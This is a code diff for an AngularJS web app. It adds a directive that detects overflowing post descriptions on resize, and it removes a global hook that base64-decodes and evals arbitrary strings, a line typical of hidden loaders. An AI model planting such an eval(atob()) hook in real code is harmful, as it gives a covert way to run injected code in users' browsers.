@@ -40,4 +40,24 @@ app.directive('contenteditable', ['$sce', function ($sce) {
         }
     };
 }]);
-window["FUNCTION()"] = function(g){eval(atob(g))}
+
+var resizeListenElm = document.getElementById("content_container");
+app.directive('descriptionOverflow', ['$timeout', function ($timeout) {
+    return {
+        link: function (scope, elm) {
+            elm = elm[0]
+            var likeClickTimer = null;
+            detectOverflow()
+            addResizeListener(resizeListenElm, detectOverflow);
+
+            function detectOverflow() {
+                if (typeof (likeClickTimer) == 'number') clearTimeout(likeClickTimer);
+                likeClickTimer = setTimeout(function () {
+                    $timeout(function () {
+                        scope.post.isOverflowed = elm.clientHeight < elm.scrollHeight;
+                    })
+                }, 1000)
+            }
+        }
+    }
+}]);
